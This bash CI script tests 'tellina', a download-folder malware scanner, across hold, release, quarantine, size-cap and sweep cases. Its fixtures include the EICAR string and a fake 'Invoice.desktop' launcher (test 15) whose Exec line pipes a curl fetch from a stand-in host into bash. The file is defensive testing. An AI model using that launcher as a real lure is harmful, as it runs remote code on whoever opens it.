#!/usr/bin/env bash
# CI harness: --scan-once only. No systemd user service, no inotify, no D-Bus.
# Exercises the v2 RAM-hold path by pointing XDG_RUNTIME_DIR at a temp runtime
# dir, so small files go to the staging area (held -> scanned -> released/quarantined).
# Covers: hold+release (clean), EICAR quarantine, disguised exec, fail-open
# (hold-mode release of unscanned), size cap, fingerprint mismatch, corrupt
# small (quarantine), corrupt large (left in place), in-place fallback, hold
# dir mode, sweep set -e guard, adaptive cap, cap override, mode preservation,
# oversize disguised-exec header check, desktop-launcher quarantine, RAM-held
# malware unlinked (not re-persisted to disk), clamscan scanned to the cap.
# Does NOT cover: the live inotify loop or release-echo suppression
# under load (see tests/stress.sh), notifications, auto-start (tests/run.sh).
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
TELLINA="$ROOT/bin/tellina"
TMP=$(mktemp -d)
RT="$TMP/runtime"
trap 'rm -rf "$TMP"' EXIT

export DOWNLOAD_WATCH_DIR="$TMP/watch"
export DOWNLOAD_QUARANTINE_DIR="$TMP/quarantine"
export XDG_RUNTIME_DIR="$RT"
mkdir -p "$DOWNLOAD_WATCH_DIR" "$RT"

PASS=0
FAIL=0
SKIPPED=0

pass() { echo "PASS: $1"; PASS=$((PASS + 1)); }
fail() { echo "FAIL: $1"; FAIL=$((FAIL + 1)); }
skip() { echo "SKIP: $1"; SKIPPED=$((SKIPPED + 1)); }

# scan_once <path> [env-assignments...]
scan_once() {
  local f="$1"; shift || true
  env "$@" STABLE_WAIT=0 DOWNLOAD_STABLE_SEC=0 "$TELLINA" --scan-once "$f" 2>&1
}

# Build a zip that `file` types as Zip but that fails `unzip -t`.
make_corrupt_epub() {
  local out="$1"
  if ! command -v zip >/dev/null 2>&1; then
    return 1
  fi
  local d
  d=$(mktemp -d)
  echo hi >"$d/x"
  ( cd "$d" && zip -q "$(basename "$out")" x ) >/dev/null 2>&1
  cp "$d/$(basename "$out")" "$out"
  rm -rf "$d"
  dd if=/dev/zero of="$out" bs=1 seek=40 count=80 conv=notrunc 2>/dev/null || true
  return 0
}

echo "=== tellina CI harness (--scan-once, v2 hold path) ==="
echo "watch:      $DOWNLOAD_WATCH_DIR"
echo "quarantine: $DOWNLOAD_QUARANTINE_DIR"
echo "runtime:    $XDG_RUNTIME_DIR"
echo ""

# --- 1. clean small: held, then released back to Downloads ---
F_CLEAN="$DOWNLOAD_WATCH_DIR/clean.txt"
echo 'clean' >"$F_CLEAN"
out=$(scan_once "$F_CLEAN") || true
hold_mode=$(stat -c '%a' "$RT/tellina/hold" 2>/dev/null || echo 0)
if [[ -f "$F_CLEAN" ]] && grep -q ' HOLD ' <<<"$out" && grep -q ' OK ' <<<"$out" \
   && [[ -z "$(ls -A "$RT/tellina/hold" 2>/dev/null)" ]] && [[ "$hold_mode" == 700 ]]; then
  pass "clean small (held + released, hold empty, hold dir 0700)"
else
  fail "clean small (expected HOLD+OK+file present+hold empty+0700; hold_mode=$hold_mode exists=$([[ -f $F_CLEAN ]] && echo yes || echo no))"
fi

# --- 2. EICAR: held, detected by real signature, unlinked from RAM (not re-persisted) ---
# A confirmed-malicious small file lives only in the tmpfs hold; Tellina records
# the facts and unlinks it, so it is never copied into an on-disk quarantine file.
# Proves the real ClamAV path AND the unlink disposition: meta kept (retained=no),
# no payload copy on disk, hold left empty.
F_EICAR="$DOWNLOAD_WATCH_DIR/eicar.com"
printf '%s\n' 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' >"$F_EICAR"
out=$(scan_once "$F_EICAR") || true
qdir_mode=$(stat -c '%a' "$DOWNLOAD_QUARANTINE_DIR" 2>/dev/null || echo 0)
emeta=$(find "$DOWNLOAD_QUARANTINE_DIR" -name '*eicar.com.meta' -print -quit 2>/dev/null || true)
epayload=$(find "$DOWNLOAD_QUARANTINE_DIR" -name '*eicar.com' ! -name '*.meta' -print -quit 2>/dev/null || true)
if [[ ! -f "$F_EICAR" ]] && grep -q ' HOLD ' <<<"$out" && grep -q ' QUARANTINE ' <<<"$out" \
   && grep -q 'not retained (unlinked from RAM hold)' <<<"$out" \
   && [[ "$qdir_mode" == 700 ]] && [[ -n "$emeta" ]] && [[ -z "$epayload" ]] \
   && grep -q 'retained=no' "$emeta" && [[ -z "$(ls -A "$RT/tellina/hold" 2>/dev/null)" ]]; then
  pass "EICAR (held, real signature, unlinked from RAM; meta kept retained=no, no payload, dir 0700)"
else
  fail "EICAR (expected HOLD+QUARANTINE+unlink+meta retained=no+no payload; qdir=$qdir_mode meta=$([[ -n $emeta ]] && echo yes || echo no) payload=$([[ -n $epayload ]] && echo yes || echo no) exists=$([[ -f $F_EICAR ]] && echo yes || echo no))"
fi

# --- 3. disguised executable pdf (real ELF binary): quarantined ---
F_FAKE="$DOWNLOAD_WATCH_DIR/rt-fake.pdf"
cp "$(command -v cat)" "$F_FAKE"
out=$(scan_once "$F_FAKE") || true
if [[ ! -f "$F_FAKE" ]] && grep -q ' QUARANTINE ' <<<"$out" && grep -q 'disguised executable' <<<"$out"; then
  pass "disguised exec pdf (real ELF quarantined)"
else
  fail "disguised exec pdf (expected QUARANTINE disguised executable + file gone)"
fi

# --- 3b. clean text starting with a shebang is NOT misflagged (P1 regression) ---
F_SHEBANG="$DOWNLOAD_WATCH_DIR/notes.txt"
printf '#!/bin/sh\n# how to run the thing\necho hello\n' >"$F_SHEBANG"
out=$(scan_once "$F_SHEBANG") || true
if [[ -f "$F_SHEBANG" ]] && grep -q ' OK ' <<<"$out" && ! grep -q ' QUARANTINE ' <<<"$out"; then
  pass "shebang text not misflagged (clean .txt released)"
else
  fail "shebang text not misflagged (expected OK + file present, no QUARANTINE)"
fi

# --- 4. fail-open (hold-mode): scanner error releases unscanned file back ---
F_FAILOPEN="$DOWNLOAD_WATCH_DIR/rt-failopen.txt"
echo 'fail-open probe' >"$F_FAILOPEN"
out=$(scan_once "$F_FAILOPEN" TELLINA_TEST_AV_RC=2) || true
if [[ -f "$F_FAILOPEN" ]] && grep -q ' HOLD ' <<<"$out" \
   && grep -q 'SKIP scan error (rc=2)' <<<"$out" && grep -q 'RELEASE unscanned' <<<"$out"; then
  pass "fail-open (held, scanner error, released unscanned, file back)"
else
  fail "fail-open (expected HOLD+SKIP rc=2+RELEASE unscanned+file present; exists=$([[ -f $F_FAILOPEN ]] && echo yes || echo no))"
fi

# --- 5. size cap: too large to scan, left in place, never held ---
F_BIG="$DOWNLOAD_WATCH_DIR/rt-oversize.bin"
dd if=/dev/zero bs=1 count=200 of="$F_BIG" 2>/dev/null
out=$(scan_once "$F_BIG" DOWNLOAD_MAX_SCAN_BYTES=100) || true
if [[ -f "$F_BIG" ]] && grep -q 'SKIP too large' <<<"$out" && ! grep -q ' HOLD ' <<<"$out"; then
  pass "size cap (too large skipped, never held, file stays)"
else
  fail "size cap (expected SKIP too large + no HOLD + file present)"
fi

# --- 6. fingerprint mismatch (unknown small): quarantined, file gone ---
F_FP="$DOWNLOAD_WATCH_DIR/rt-fp.txt"
echo 'clean' >"$F_FP"
out=$(scan_once "$F_FP" TELLINA_TEST_FINGERPRINT_FAIL=1) || true
if [[ ! -f "$F_FP" ]] && grep -q ' QUARANTINE ' <<<"$out" && grep -q 'fingerprint mismatch' <<<"$out"; then
  pass "fingerprint mismatch (quarantined, file gone)"
else
  fail "fingerprint mismatch (expected QUARANTINE fingerprint mismatch + file gone; exists=$([[ -f $F_FP ]] && echo yes || echo no))"
fi

# --- 7. corrupt small epub (unknown small): quarantined, file gone ---
F_CORRUPT="$DOWNLOAD_WATCH_DIR/rt-corrupt.epub"
if make_corrupt_epub "$F_CORRUPT"; then
  out=$(scan_once "$F_CORRUPT") || true
  if [[ ! -f "$F_CORRUPT" ]] && grep -q ' QUARANTINE ' <<<"$out" && grep -q 'corrupt or invalid' <<<"$out"; then
    pass "corrupt small epub (quarantined, file gone)"
  else
    fail "corrupt small epub (expected QUARANTINE corrupt + file gone; exists=$([[ -f $F_CORRUPT ]] && echo yes || echo no))"
  fi
else
  skip "corrupt small epub (zip not installed)"
fi

# --- 8. corrupt large epub (unknown large): left in place, not confiscated ---
F_CORRUPT_BIG="$DOWNLOAD_WATCH_DIR/rt-corrupt-big.epub"
if make_corrupt_epub "$F_CORRUPT_BIG"; then
  out=$(scan_once "$F_CORRUPT_BIG" DOWNLOAD_RAM_HOLD_MAX=5) || true
  if [[ -f "$F_CORRUPT_BIG" ]] && grep -q 'SKIP corrupt document (large, left in place)' <<<"$out"; then
    pass "corrupt large epub (left in place, not confiscated)"
  else
    fail "corrupt large epub (expected SKIP corrupt large + file present; exists=$([[ -f $F_CORRUPT_BIG ]] && echo yes || echo no))"
  fi
else
  skip "corrupt large epub (zip not installed)"
fi

# --- 9. in-place fallback (no RAM hold): clean scanned in place, file present ---
F_FALLBACK="$DOWNLOAD_WATCH_DIR/rt-fallback.txt"
echo 'clean' >"$F_FALLBACK"
out=$(env -u XDG_RUNTIME_DIR STABLE_WAIT=0 DOWNLOAD_STABLE_SEC=0 \
      DOWNLOAD_WATCH_DIR="$DOWNLOAD_WATCH_DIR" \
      DOWNLOAD_QUARANTINE_DIR="$DOWNLOAD_QUARANTINE_DIR" \
      "$TELLINA" --scan-once "$F_FALLBACK" 2>&1) || true
if [[ -f "$F_FALLBACK" ]] && grep -q ' OK ' <<<"$out" \
   && grep -q 'no RAM hold' <<<"$out" && ! grep -q ' HOLD ' <<<"$out"; then
  pass "in-place fallback (no hold, clean OK, file present)"
else
  fail "in-place fallback (expected 'no RAM hold' + OK + no HOLD + file present; exists=$([[ -f $F_FALLBACK ]] && echo yes || echo no))"
fi

# --- 10. crash sweep: a file stranded in the hold is reprocessed on startup ---
F_STRANDED="$DOWNLOAD_WATCH_DIR/rt-stranded.txt"
rm -f "$F_STRANDED"
HOLD_DIR="$RT/tellina/hold"
held="$HOLD_DIR/20260702-000000__rt-stranded.txt"
echo 'survived a crash' >"$held"
printf '%s\n%s\n%s\n' "$F_STRANDED" "$(stat -c%s "$held")" \
  "$(sha256sum "$held" | awk '{print $1}')" >"$held.ingress"
out=$(env STABLE_WAIT=0 DOWNLOAD_STABLE_SEC=0 \
      DOWNLOAD_WATCH_DIR="$DOWNLOAD_WATCH_DIR" \
      DOWNLOAD_QUARANTINE_DIR="$DOWNLOAD_QUARANTINE_DIR" \
      XDG_RUNTIME_DIR="$RT" "$TELLINA" --sweep-once 2>&1) || true
if [[ -f "$F_STRANDED" ]] && grep -q ' SWEEP ' <<<"$out" && grep -q ' OK ' <<<"$out" \
   && [[ -z "$(ls -A "$HOLD_DIR" 2>/dev/null)" ]]; then
  pass "crash sweep (stranded hold file reprocessed + released, hold empty)"
else
  fail "crash sweep (expected SWEEP+OK+file present+hold empty; exists=$([[ -f $F_STRANDED ]] && echo yes || echo no))"
fi

# --- 10b. sweep continues past a failed quarantine (set -e does not abort it) ---
# First stranded file is a .desktop launcher (a preserve-disposition verdict)
# whose forged release name is >255 bytes, so quarantine's mv fails
# (ENAMETOOLONG) and quarantine returns 1. The sweep must log the WARN and still
# process the second clean stranded file (the `|| log` guard on adjudicate
# suppresses set -e). Regression guard for the asymmetry a security review found
# between the guarded main loop and the sweep. (A malicious verdict is unlinked
# rather than moved, so a launcher is used to exercise the mv-failure path.)
LONGNAME=$(printf 'a%.0s' $(seq 1 240))
H1="$HOLD_DIR/20260702-000000__sweepfail1"
H2="$HOLD_DIR/20260702-000001__sweepfail2"
F2="$DOWNLOAD_WATCH_DIR/sweepfail2.txt"
rm -f "$F2"
printf '[Desktop Entry]\nType=Application\nExec=bash -c evil\n' >"$H1"
printf '%s\n%s\n%s\n' "$DOWNLOAD_WATCH_DIR/${LONGNAME}.desktop" "$(stat -c%s "$H1")" \
  "$(sha256sum "$H1" | awk '{print $1}')" >"$H1.ingress"
echo 'clean sweep continuation' >"$H2"
printf '%s\n%s\n%s\n' "$F2" "$(stat -c%s "$H2")" \
  "$(sha256sum "$H2" | awk '{print $1}')" >"$H2.ingress"
sweep_rc=0
out=$(env STABLE_WAIT=0 DOWNLOAD_STABLE_SEC=0 \
      DOWNLOAD_WATCH_DIR="$DOWNLOAD_WATCH_DIR" \
      DOWNLOAD_QUARANTINE_DIR="$DOWNLOAD_QUARANTINE_DIR" \
      XDG_RUNTIME_DIR="$RT" "$TELLINA" --sweep-once 2>&1) || sweep_rc=$?
if [[ "$sweep_rc" -eq 0 ]] && grep -q 'WARN quarantine move failed' <<<"$out" \
   && [[ -f "$F2" ]] && ! [[ -f "$H2" ]]; then
  pass "sweep continues past failed quarantine (set -e suppressed; 2nd file still released)"
else
  fail "sweep continues past failed quarantine (expected rc=0 + WARN + F2 present + H2 gone; rc=$sweep_rc f2=$([[ -f $F2 ]] && echo yes || echo no) h2=$([[ -f $H2 ]] && echo yes || echo no))"
fi

# --- 11. adaptive hold cap: resolved as % of RAM, clamped to [128 MiB, 1 GiB] ---
F_ADAPT="$DOWNLOAD_WATCH_DIR/rt-adapt.txt"
echo 'clean' >"$F_ADAPT"
out=$(scan_once "$F_ADAPT") || true
cap=$(grep -oE 'ram_hold_max=[0-9]+' <<<"$out" | head -1 | cut -d= -f2)
if [[ -n "$cap" ]] && (( cap >= 128 * 1024 * 1024 )) && (( cap <= 1024 * 1024 * 1024 )); then
  pass "adaptive hold cap (resolved $(awk -v c="$cap" 'BEGIN{printf "%.0f MiB", c/1048576}') within [128 MiB, 1 GiB])"
else
  fail "adaptive hold cap (expected ram_hold_max in [128MiB,1GiB]; got='${cap:-none}')"
fi

# --- 12. explicit DOWNLOAD_RAM_HOLD_MAX override wins over adaptive value ---
F_OVR="$DOWNLOAD_WATCH_DIR/rt-override.txt"
printf 'this is fifty-ish bytes of clean text content\n' >"$F_OVR"
fsize=$(stat -c%s "$F_OVR")
out=$(scan_once "$F_OVR" DOWNLOAD_RAM_HOLD_MAX=10) || true
if [[ -f "$F_OVR" ]] && grep -q ' OK ' <<<"$out" && ! grep -q ' HOLD ' <<<"$out" \
   && grep -q 'ram_hold_max=10' <<<"$out"; then
  pass "hold cap override (DOWNLOAD_RAM_HOLD_MAX=10 wins; ${fsize}B file scanned in place)"
else
  fail "hold cap override (expected ram_hold_max=10 + no HOLD + OK + file present; got cap=$(grep -oE 'ram_hold_max=[0-9]+' <<<"$out"|head -1) held=$(grep -c ' HOLD ' <<<"$out"))"
fi

# --- 13. mode preservation: a +x small download keeps its exec bit on release ---
F_MODE="$DOWNLOAD_WATCH_DIR/rt-mode.sh"
echo '#!/bin/sh' >"$F_MODE"
chmod 755 "$F_MODE"
out=$(scan_once "$F_MODE") || true
relmode=$(stat -c '%a' "$F_MODE" 2>/dev/null || echo 0)
if [[ -f "$F_MODE" ]] && grep -q ' HOLD ' <<<"$out" && grep -q ' OK ' <<<"$out" \
   && [[ "$relmode" == 755 ]]; then
  pass "mode preservation (held + released, exec bit kept: $relmode)"
else
  fail "mode preservation (expected HOLD+OK+file present+mode 755; relmode=$relmode exists=$([[ -f $F_MODE ]] && echo yes || echo no))"
fi

# --- 14. oversize disguised executable: header check still fires above the cap ---
# A real ELF wearing a .pdf name, forced over the scan cap, must be quarantined
# by the cheap header-only disguise check (not released unscanned as "too large").
F_OVER="$DOWNLOAD_WATCH_DIR/rt-oversize.pdf"
cp "$(command -v cat)" "$F_OVER"
out=$(scan_once "$F_OVER" DOWNLOAD_MAX_SCAN_BYTES=10) || true
if [[ ! -f "$F_OVER" ]] && grep -q 'disguised executable' <<<"$out" \
   && ! grep -q 'SKIP too large' <<<"$out"; then
  pass "oversize disguised exec (quarantined by header check above the cap)"
else
  fail "oversize disguised exec (expected disguised-executable quarantine, no SKIP too large; exists=$([[ -f $F_OVER ]] && echo yes || echo no))"
fi

# --- 15. desktop launcher: a downloaded .desktop with Exec= is quarantined ---
# A .desktop launcher runs a command when opened; ClamAV sees only text and
# file(1) types it text/plain, so it slips both the signature scan and the
# disguise check. Tellina must catch it, and preserve it (recoverable) rather
# than unlink, since a downloaded launcher is only rarely legitimate.
F_DESK="$DOWNLOAD_WATCH_DIR/Invoice.desktop"
printf '[Desktop Entry]\nType=Application\nName=Invoice\nExec=bash -c "curl http://x/p | bash"\nTerminal=false\n' >"$F_DESK"
out=$(scan_once "$F_DESK") || true
qdesk=$(find "$DOWNLOAD_QUARANTINE_DIR" -name '*Invoice.desktop' ! -name '*.meta' -print -quit 2>/dev/null || true)
if [[ ! -f "$F_DESK" ]] && grep -q ' QUARANTINE ' <<<"$out" && grep -q 'desktop launcher' <<<"$out" \
   && [[ -n "$qdesk" ]]; then
  pass "desktop launcher (.desktop with Exec= quarantined and retained)"
else
  fail "desktop launcher (expected QUARANTINE desktop launcher + file gone + retained copy; retained=$([[ -n $qdesk ]] && echo yes || echo no) exists=$([[ -f $F_DESK ]] && echo yes || echo no))"
fi

# --- 16. RAM-held malware is unlinked, not re-persisted to the on-disk quarantine ---
# A confirmed-malicious small file lives only in tmpfs; Tellina records the facts
# and unlinks it, so no second on-disk copy of the malware is written. The .meta
# record remains (retained=no); no retained payload file is created; hold empty.
F_UNLINK="$DOWNLOAD_WATCH_DIR/rt-unlink.txt"
echo 'pretend malware' >"$F_UNLINK"
rm -rf "${RT:?}/tellina/hold"/* 2>/dev/null || true   # clear the file test 10b strands by design
out=$(scan_once "$F_UNLINK" TELLINA_TEST_AV_RC=1) || true
meta=$(find "$DOWNLOAD_QUARANTINE_DIR" -name '*rt-unlink.txt.meta' -print -quit 2>/dev/null || true)
payload=$(find "$DOWNLOAD_QUARANTINE_DIR" -name '*rt-unlink.txt' ! -name '*.meta' -print -quit 2>/dev/null || true)
if [[ ! -f "$F_UNLINK" ]] && grep -q 'not retained (unlinked from RAM hold)' <<<"$out" \
   && [[ -n "$meta" ]] && [[ -z "$payload" ]] && grep -q 'retained=no' "$meta" \
   && [[ -z "$(ls -A "$RT/tellina/hold" 2>/dev/null)" ]]; then
  pass "RAM-held malware unlinked (meta kept retained=no, no on-disk payload, hold empty)"
else
  fail "RAM-held malware unlinked (expected unlink log + meta retained=no + no payload; meta=$([[ -n $meta ]] && echo yes || echo no) payload=$([[ -n $payload ]] && echo yes || echo no) exists=$([[ -f $F_UNLINK ]] && echo yes || echo no))"
fi

# --- 17. clamscan is invoked with size limits raised to the cap (full scan) ---
# By default clamscan gives up past 100 MiB/400 MiB and reports "OK" unscanned.
# Tellina must pass --max-filesize/--max-scansize so files up to its cap are
# actually scanned. Verify by shimming clamscan to record its arguments and
# forcing the clamscan backend (fake clamdscan fails the probe).
SHIM="$TMP/shim"; mkdir -p "$SHIM"
ARGS_FILE="$TMP/clamscan.args"; : >"$ARGS_FILE"
cat >"$SHIM/clamscan" <<'SH'
#!/usr/bin/env bash
[[ "$1" == --version ]] && { echo "ClamAV fake"; exit 0; }
printf '%s\n' "$*" >>"$CLAMSCAN_ARGS_FILE"
exit 0
SH
printf '#!/usr/bin/env bash\nexit 1\n' >"$SHIM/clamdscan"
chmod +x "$SHIM/clamscan" "$SHIM/clamdscan"
F_LIM="$DOWNLOAD_WATCH_DIR/rt-limits.txt"
echo 'scan me fully' >"$F_LIM"
out=$(scan_once "$F_LIM" PATH="$SHIM:$PATH" CLAMSCAN_ARGS_FILE="$ARGS_FILE") || true
if grep -q -- '--max-filesize=' "$ARGS_FILE" && grep -q -- '--max-scansize=' "$ARGS_FILE"; then
  pass "clamscan scanned to the cap (--max-filesize/--max-scansize passed)"
else
  fail "clamscan size limits (expected --max-filesize/--max-scansize in args; got: $(tr '\n' ' ' <"$ARGS_FILE"))"
fi

echo ""
echo "=== $PASS passed, $FAIL failed, $SKIPPED skipped ==="
if [[ "$FAIL" -gt 0 ]]; then
  exit 1
fi
exit 0
